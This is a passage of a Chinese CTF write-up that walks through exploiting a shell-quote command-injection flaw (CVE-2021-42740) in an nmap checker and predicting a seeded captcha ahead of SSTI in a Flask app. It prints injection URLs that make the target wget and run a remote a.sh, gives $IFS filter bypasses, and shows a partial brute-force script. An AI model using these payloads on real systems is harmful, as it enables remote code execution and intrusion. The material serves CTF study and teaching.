function_">get</span>(<span class="string">'/checker'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">  <span class="keyword">let</span> url = req.<span class="property">query</span>.<span class="property">url</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (url) {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> host;</span><br><span class="line">    <span class="keyword">let</span> port;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MakE it Safer!!!!! </span></span><br><span class="line">    <span class="keyword">if</span> (url.<span class="title function_">includes</span>(<span class="string">":"</span>)) {</span><br><span class="line">      <span class="keyword">const</span> parts = url.<span class="title function_">split</span>(<span class="string">":"</span>);</span><br><span class="line">      host = parts[<span class="number">0</span>];</span><br><span class="line">      port = parts.<span class="title function_">slice</span>(<span class="number">1</span>).<span class="title function_">join</span>(<span class="string">":"</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      host = url;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (port) {</span><br><span class="line">      command = shellQuote.<span class="title function_">quote</span>([<span class="string">"nmap"</span>, <span class="string">"-p"</span>, port, host]); <span class="comment">// Construct the shell command</span></span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      command = shellQuote.<span class="title function_">quote</span>([<span class="string">"nmap"</span>, <span class="string">"-p"</span>, <span class="string">"80"</span>, host]);</span><br><span class="line">    }</span><br><span class="line">    nmap = <span class="title function_">spawn</span>(<span class="string">"bash"</span>, [<span class="string">"-c"</span>, command]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(command);</span><br><span class="line">    </span><br><span class="line">    nmap.<span class="title function_">on</span>(<span class="string">'exit'</span>, <span class="keyword">function</span> (<span class="params">code</span>) {</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'child process exited with code '</span> + code.<span class="title function_">toString</span>());</span><br><span class="line">      <span class="keyword">if</span> (code !== <span class="number">0</span>) {</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`Error executing command!!!`</span>);</span><br><span class="line">      } <span class="keyword">else</span> {</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">`Ok...`</span>);</span><br><span class="line">      }</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">'No parameter provided.'</span>);</span><br><span class="line">  }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
<p>ä¸å¤š bb, å°±æ˜¯æ‰“è¿™ä¸ª checker è·¯ç”±.</p>
<p>ğŸ‘´è§‰å¾— shellQuote,quote å¾ˆé™Œç”Ÿï¼Œå¾ˆä¸å¯¹åŠ²ï¼Œæ€ä¹ˆåŠï¼Œæœ exp!</p>
<p>åˆ«è·ŸğŸ‘´è¯´ä½ ä¸ä¼šæœï¼Œnmd ä¸è¦ç”¨å›½å†…çš„ç­”è¾©å¼•æ“ï¼Œä¸ŠğŸ¥ğŸ•Šç›´æ¥:shellQuote exploit</p>
<p>ç¬¬ä¸€ä¸ªå°±æ˜¯äº†ï¼Œå…¶å®ƒéƒ½ä¸å¥½ä½¿:<a target="_blank" rel="noopener" href="https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html">Exploiting CVE-2021-42740 (wh0.github.io)</a></p>
<p>ä¸è¯´äººè¯:shell-quote åŒ…é€šå¸¸ç”¨äºè½¬ä¹‰ä¸å—ä¿¡ä»»çš„è¾“å…¥ï¼Œä»¥ä¾¿åœ¨ shell å‘½ä»¤ä¸­ä½¿ç”¨ã€‚æ­¤ç¤ºä¾‹é‡‡ç”¨ä¸å—ä¿¡ä»»çš„è¾“å…¥ï¼Œå¼•ç”¨å®ƒï¼Œå¹¶é€šè¿‡ä¸€ä¸ªå‘½ä»¤è¿è¡Œå®ƒï¼Œè¯¥å‘½ä»¤å°†å…¶æ‰“å°å‡ºæ¥ã€‚æˆ‘ä»¬åªå¸Œæœ›å®ƒè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯å…è®¸ä¸å—ä¿¡ä»»çš„è¾“å…¥è¿è¡Œä»»æ„å‘½ä»¤ã€‚å‡è®¾æˆ‘ä»¬åœ¨è·¯å¾„ä¸­è°ƒç”¨ pwnme äº†è¿™ä¸ªç¨‹åºï¼Œå¦‚æœå®ƒè¢«æ‰§è¡Œï¼Œæˆ‘ä»¬å°±å¤±è´¥äº†æˆ‘ä»¬çš„å®‰å…¨ç›®æ ‡ï¼š</p>
<p>æœ‰ç‚¹éš¾æ‡‚ï¼Œæ¥ä¸ª demo è¯•ä¸€ä¸‹.</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title class_">String</span>(s).<span class="title function_">replace</span>(<span class="regexp">/([A-z]:)?([#!"$&amp;'()*,:;&lt;=&gt;?@\[\\\]^`{|}])/g</span>, <span class="string">'$1\\$2'</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>æœ€å¥½åœ¨è™šæ‹Ÿæœºä¸Šç”¨ï¼Œtest.js å¦‚ä¸‹</p>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> childProcess = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> shellQuote = <span class="built_in">require</span>(<span class="string">'shell-quote'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> untrusted = process.<span class="property">argv</span>[<span class="number">2</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'untrusted'</span>, untrusted);</span><br><span class="line"><span class="keyword">const</span> result = childProcess.<span class="title function_">execSync</span>(shellQuote.<span class="title function_">quote</span>([<span class="string">'printf'</span>, <span class="string">'%s\n'</span>, untrusted]));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'result'</span>, result);</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node test.<span class="property">js</span> <span class="string">'`:`./pwnme``:`'</span></span><br></pre></td></tr></tbody></table></figure>
<p>è¿™é‡Œçš„</p>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'`:`pwnme``:`'</span></span><br></pre></td></tr></tbody></table></figure>
<p>ç›¸å½“äº untrsuted,ğŸ‘´ç›´æ¥å°±è¯´äº†.</p>
<p>pwnme è¾“å…¥</p>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!<span class="regexp">/bin/</span>sh</span><br><span class="line">touch /tmp/i-am-pwned</span><br><span class="line">echo <span class="string">"oh no"</span></span><br></pre></td></tr></tbody></table></figure>
<p>è¾“å…¥å‘½ä»¤</p>
<figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node test.<span class="property">js</span> <span class="string">'`:`./pwnme``:`'</span></span><br></pre></td></tr></tbody></table></figure>
<p>ç›´æ¥å°±èƒ½æ‰§è¡Œ pwnme é‡Œé¢çš„å†…å®¹äº†</p>
<p>ç©ºæ ¼è¢« ban æ€ä¹ˆåŠï¼Œç”¨ $IFS, åˆ«è¿™ä¹Ÿè¦ğŸ‘´æ•™.</p>
<p>ä½ ç°åœ¨æ˜ç™½äº†æ€ä¹ˆç»˜ä¸–äº†.</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command = shellQuote.<span class="title function_">quote</span>([<span class="string">"nmap"</span>, <span class="string">"-p"</span>, port, host]);</span><br></pre></td></tr></tbody></table></figure>
<p>ç°åœ¨ä¹Ÿå°±æ˜¯è¦æ§åˆ¶ <code>port</code>  äº†</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"127.0.0.1:`:`wget$IFS``:`</span></span><br></pre></td></tr></tbody></table></figure>
<p>$IFS</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">20</span>%<span class="number">09</span>%0A%<span class="number">00</span>%0A</span><br></pre></td></tr></tbody></table></figure>
<p>$9</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">09</span></span><br></pre></td></tr></tbody></table></figure>
<p>å…ˆä¸‹è½½</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//124.70.33.170:24001/checker?url="127.0.0.0:`:`wget$IFS$943.143.192.19:7777/a.sh``:`</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031150210.png" alt="å¾®ä¿¡æˆªå›¾_20231031150210"></p>
<p>æŠ¥é”™å¹¶æ— å…³ç³»ï¼Œå·²ç»æ‰§è¡ŒåŠ›.</p>
<p>å†æ‰§è¡Œ</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//124.70.33.170:24001/checker?url="127.0.0.0:`:`bash$IFS$9a.sh``:`</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231031150159.png" alt="å¾®ä¿¡æˆªå›¾_20231031150159"></p>
<p>èŠœæ¹–ï¼Œå¥¥åˆ©å®‰è´¹ï¼Œå¤ª tm çˆ½äº†.</p>
<p>ğŸ‘´é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œç”¨æ–œæ ä¹Ÿèƒ½ç»•è¿‡</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//124.70.33.170:24001/checker?url="127.0.0.0:`:`bash$IFS\a.sh``:`</span></span><br></pre></td></tr></tbody></table></figure>
<h1 id="story"><span id="story"> story</span></h1>
<p>ã“ã‚Œã¯ã€ã‚ãŸã—ã®ç‰©èªğŸ¤£,wcsndm é¢˜ç›®ç¯å¢ƒæ²¡äº†ï¼Œè‡ªå·±æœ¬åœ°æ­ docker.</p>
<p>ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œå› ä¸ºğŸ‘´é­”æ”¹äº†ä¸€ä¸‹æºç ï¼Œä¸€æ ·èƒ½å’Œé¢˜ç›®æ•ˆæœå·®ä¸å¤š</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="built_in">str</span>(uuid.uuid4())</span><br></pre></td></tr></tbody></table></figure>
<p>ä¸ºäº†ä¿è¯é¢˜ç›®å¯†é’¥çš„éšæœºæ€§ï¼ŒğŸ‘´æ”¹æˆäº†è¿™ b ç©æ„ï¼ŒğŸ‘´å¯å¤ª nb äº†</p>
<p>ä¸å¤š bb, å…ˆä¸Šæºç ï¼Œè®©ğŸ‘´æ¥çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ğŸ˜Š</p>
<h2 id="æºç "><span id="æºç "> æºç ğŸ¤”</span></h2>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">captcha</span>():</span><br><span class="line">    gen = Captcha(<span class="number">200</span>, <span class="number">80</span>)</span><br><span class="line">    buf , captcha_text = gen.generate()</span><br><span class="line"></span><br><span class="line">    session[<span class="string">'captcha'</span>] = captcha_text</span><br><span class="line">    <span class="keyword">return</span> buf.getvalue(), <span class="number">200</span>, {</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'image/png'</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: <span class="built_in">str</span>(<span class="built_in">len</span>(buf.getvalue()))</span><br><span class="line">    }</span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">'/vip'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vip</span>():</span><br><span class="line">    captcha = generate_code()</span><br><span class="line">    captcha_user = request.json.get(<span class="string">'captcha'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> captcha == captcha_user:</span><br><span class="line">        session[<span class="string">'vip'</span>] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/story'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">story</span>():</span><br><span class="line">    story = session.get(<span class="string">'story'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> story <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> story != <span class="string">""</span>:</span><br><span class="line">        tpl = <span class="built_in">open</span>(<span class="string">'templates/story.html'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">        <span class="keyword">return</span> render_template_string(tpl % story) </span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"/"</span>)       </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/write'</span>, methods=[<span class="string">'POST'</span>,<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'/'</span>)</span><br><span class="line">    </span><br><span class="line">    story = request.json.get(<span class="string">'story'</span>, <span class="string">''</span>) </span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">'vip'</span>, <span class="string">''</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> minic_waf(story):</span><br><span class="line">            session[<span class="string">'username'</span>] = <span class="string">""</span></span><br><span class="line">            session[<span class="string">'vip'</span>] = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> jsonify({<span class="string">'status'</span>: <span class="string">'error'</span>, <span class="string">'message'</span>: <span class="string">'no way~~~'</span>})</span><br><span class="line">        </span><br><span class="line">        session[<span class="string">'story'</span>] = story</span><br><span class="line">        <span class="keyword">return</span> jsonify({<span class="string">'status'</span>: <span class="string">'success'</span>, <span class="string">'message'</span>: <span class="string">'success'</span>})</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify({<span class="string">'status'</span>: <span class="string">'error'</span>, <span class="string">'message'</span>: <span class="string">'Please become a VIP first.'</span>}), <span class="number">400</span></span><br></pre></td></tr></tbody></table></figure>
<p>ğŸ‘´åªæ”¾äº†ä¸‰ä¸ªè·¯ç”±ï¼Œä¸æ˜¯æ‡’ï¼Œè€Œæ˜¯æ²¡æœ‰å¿…è¦ï¼Œä½ ç”¨ä¸ç€è¿™ä¹ˆå¤šäº†ğŸ¤£</p>
<p>å¾ˆæ˜æ˜¾ï¼Œæœ€ç»ˆåˆ©ç”¨ç‚¹å°±æ˜¯ story è·¯ç”±ä¸‹çš„ render_template_string, ä¼—æ‰€å‘¨çŸ¥ï¼Œè¿™æ˜¯ SSTI çš„è§¦å‘ç‚¹.</p>
<p>ä½†æ˜¯å‚æ•°æ˜¯ä» session é‡Œé¢å–å‡ºæ¥çš„ï¼Œä½ èƒ½ä¼ªé€ å—ï¼Œé‚£æ€ä¹ˆè¯´ä¹Ÿå¾—æ‹¿åˆ° SECRET_KEY å•Šï¼Œæ€ä¹ˆæ‹¿åˆ°å‘¢ï¼Œé€šè¿‡ stroy è·¯ç”± sstiæ‹¿åˆ°ï¼Œé‚£æˆ‘æ€ä¹ˆ ssti, å…ˆä¼ªé€  session, é‚£æˆ‘æ€ä¹ˆä¼ªé€  session, å…ˆæ‹¿åˆ° SECRET_KEY, é‚£æˆ‘æ€ä¹ˆæ‹¿åˆ° SCECRET_KEY å‘¢ï¼Œå…ˆ sstiâ€¦</p>
<p>å‘çˆ¹å‘¢ï¼è¿™æ˜¯ï¼ŒğŸ˜“(bushi)</p>
<p>å¥½å§ï¼Œæ­£è§£å…¶å®æ˜¯:</p>
<p>é€šè¿‡ write è·¯ç”±å†™ session çš„ story, ä½†æ˜¯ write è·¯ç”±åˆ©ç”¨æœ‰ä¸ªæ¡ä»¶ï¼Œè¦ä¼ªé€  vip, é‚£æ€ä¹ˆä¼ªé€  vip, é‚£å¿…ç„¶æ˜¯å…ˆæ‹¿åˆ° SECRET_KEYâ€¦ æˆ‘è¯´å©·å©·ï¼Œæ‰“ä½ï¼Œæ²¡å®Œäº†æ˜¯å§ğŸ¤ª.</p>
<p>vip è·¯ç”±ä¸‹èƒ½å¤Ÿè®©æˆ‘ä»¬ session ä¸­çš„ vip ä¸º true</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vip</span>():</span><br><span class="line">    captcha = generate_code()</span><br><span class="line">    captcha_user = request.json.get(<span class="string">'captcha'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> captcha == captcha_user:</span><br><span class="line">        session[<span class="string">'vip'</span>] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">'/story'</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br></pre></td></tr></tbody></table></figure>
<p>ä¸è¿‡æ¡ä»¶æ˜¯ generate_code ç­‰äºä¼ å…¥çš„ captcha, è€Œ generate_code çš„ç”Ÿæˆé€»è¾‘æ˜¯éšæœºçš„å››ä½ï¼Œè€Œä¸”æ¯è®¿é—®ä¸€æ¬¡éƒ½ä¼šå˜ï¼Œç›´æ¥çˆ†ç ´çš„äººå»ºè®®é­”æ³•æŠ«é£.</p>
<p>æˆ‘çœ‹çœ‹è¿™ä¸ª captcha çš„ç”Ÿæˆæ˜¯æ€ä¹ˆä¸ªäº‹</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_code</span>(<span class="params">length: <span class="built_in">int</span> = <span class="number">4</span></span>):</span><br><span class="line">    characters = <span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br></pre></td></tr></tbody></table></figure>
<p>è¿™ç©ä¸ª p å•Šï¼Œéšæœºç”Ÿæˆï¼Œæˆ‘çœ‹çœ‹è¿™ä¸ª class æ€ä¹ˆä¸ªäº‹</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Captcha</span>:</span><br><span class="line">    lookup_table: t.<span class="type">List</span>[<span class="built_in">int</span>] = [<span class="built_in">int</span>(i * <span class="number">1.97</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, width: <span class="built_in">int</span> = <span class="number">160</span>, height: <span class="built_in">int</span> = <span class="number">60</span>, key: <span class="built_in">int</span> = <span class="literal">None</span>, length: <span class="built_in">int</span> = <span class="number">4</span>, </span></span><br><span class="line"><span class="params">                 fonts: t.<span class="type">Optional</span>[t.<span class="type">List</span>[<span class="built_in">str</span>]] = <span class="literal">None</span>, font_sizes: t.<span class="type">Optional</span>[t.<span class="type">Tuple</span>[<span class="built_in">int</span>]] = <span class="literal">None</span></span>):</span><br><span class="line">        self._width = width</span><br><span class="line">        self._height = height</span><br><span class="line">        self._length = length</span><br><span class="line">        self._key = (key <span class="keyword">or</span> <span class="built_in">int</span>(time.time())) + random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line">        self._fonts = fonts <span class="keyword">or</span> DEFAULT_FONTS</span><br><span class="line">        self._font_sizes = font_sizes <span class="keyword">or</span> (<span class="number">42</span>, <span class="number">50</span>, <span class="number">56</span>)</span><br><span class="line">        self._truefonts: t.<span class="type">List</span>[FreeTypeFont] = []</span><br><span class="line">        random.seed(self._key)</span><br></pre></td></tr></tbody></table></figure>
<p>å“¦ï¼ŒåŸæ¥æ˜¯æœ‰ç§å­çš„å‘€ï¼Œé‚£æ²¡äº‹äº† (nmsl).</p>
<p>è¿™ç§å­æ˜¯å½“å‰æ—¶é—´æˆ³çš„å–è¯æ‹¼æ¥ 1 åˆ° 100 çš„éšæœºæ•°.</p>
<p>æ˜¾ç„¶ time æˆ‘ä»¬å¯ä»¥è‡ªå·±æœ¬åœ°ç”Ÿæˆï¼Œ1 åˆ° 100 çš„éšæœºæ•°ï¼Œå‡¹æ¦‚ç‡ä½ ä¸ä¼šï¼Ÿçˆ†ç ´ä»–ä¸ªå‡ ç™¾ä¸Šåƒæ¬¡ï¼Œæ€»èƒ½ç»ˆå‡ºçš„.</p>
<p>ç»ˆå‡ºä¸äº†ä¹Ÿåˆ«å¹²äº†ï¼Œæœºå™¨çˆ†ç ´è¿™ä¹ˆå¤šæ¬¡ï¼Œ1 åˆ° 100 æ€»å¾—ç»ˆå‡ºå§.ğŸ¥µ</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">captcha</span>():</span><br><span class="line">    gen = Captcha(<span class="number">200</span>, <span class="number">80</span>)</span><br><span class="line">    buf , captcha_text = gen.generate()</span><br><span class="line"></span><br><span class="line">    session[<span class="string">'captcha'</span>] = captcha_text</span><br><span class="line">    <span class="keyword">return</span> buf.getvalue(), <span class="number">200</span>, {</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'image/png'</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: <span class="built_in">str</span>(<span class="built_in">len</span>(buf.getvalue()))</span><br><span class="line">    }</span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">'/vip'</span>, methods=[<span class="string">'POST'</span>]</span>)</span></span><br></pre></td></tr></tbody></table></figure>
<p>ä¸ºæ­¤æˆ‘ä»¬éœ€è¦è®¿é—® captcha, æ¯æ¬¡ä»¥å½“å‰æ—¶é—´æˆ³ + éšæœºæ•°ä¸ºç§å­é‡ç½®è¿™ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥è¦å…ˆè®¿é—® captch, å†è®¿é—® /vip.</p>
<p>æµç¨‹æ˜¯</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é‡ç½®Captchaå¯¹è±¡,ä»¥å½“å‰æ—¶é—´æˆ³åŠ <span class="number">1</span>è‡³<span class="number">100</span>éšæœºæ•°-&gt;gen.generate()ç”Ÿæˆç¬¬ä¸€æ¬¡éšæœºæ•°-&gt;/vipè·¯ç”±è°ƒç”¨generate_codeéšæœºç”Ÿæˆ</span><br></pre></td></tr></tbody></table></figure>
<p>å› æ­¤ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦å¯¹è½´</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gen = Captcha(<span class="number">200</span>, <span class="number">80</span>, <span class="built_in">int</span>(time.time()) + random.randint(<span class="number">1</span>, <span class="number">100</span>))</span><br><span class="line">  gen.generate()</span><br><span class="line">  requests.get(url1 + <span class="string">"captcha"</span>, headers=headers)</span><br><span class="line">  </span><br></pre></td></tr></tbody></table></figure>
<p>é¦–å…ˆå®Œæˆè¿™äº›æ“ä½œï¼Œç„¶åè®¿é—® captcha è·¯ç”±ï¼Œæ­¤æ—¶è½´å¯¹ä¸Šäº†</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">captcha = generate_code()</span><br></pre></td></tr></tbody></table></figure>
<p>æ¥ä¸‹æ¥ç”Ÿæˆä¸€æ¬¡ generate_code (), å¹¶ä¸”è®¿é—® vip, æ­¤æ—¶æ­¥è°ƒä¸€è‡´äº†ï¼Œå€˜è‹¥ç§å­ä¸€æ ·ï¼Œè¿™æ ·çš„è¯·æ±‚ä¸åˆ° 1 ç§’èƒ½å®Œæˆï¼Œä¸ä¼šæ”¹å˜æ—¶é—´æˆ³ï¼Œé‚£ä¹ˆæœ¬åœ°ç”Ÿæˆçš„ code å’Œé¢˜ç›®ä¸€æ ·ï¼Œå°±èƒ½å¤Ÿæ‹¿åˆ° vip äº†</p>
<p>ä»Šã¯ğŸ‘´ã®å‹åˆ©ã </p>
<p>ã“ã‚ŒãŒğŸ‘´ã®æœ€å¾Œã®ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆï¼</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> utils.captcha <span class="keyword">import</span> Captcha,generate_code</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url1 =<span class="string">"http://127.0.0.1:15000/"</span></span><br><span class="line">url2 = <span class="string">"http://127.0.0.1:5001/"</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    headers={<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span>,</span><br><span class="line"></span><br><span class="line">                          <span class="string">"Connection"</span>:<span class="string">"close"</span> ,</span><br><span class="line"><span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,</span><br><span class="line"><span class="string">"Accept-Language"</span>:<span class="string">"en"</span>,</span><br><span class="line"><span class="string">"Accept"</span>:<span class="string">"*/*"</span></span><br><span class="line">             }</span><br><span class="line">    <span class="comment"># timekey = 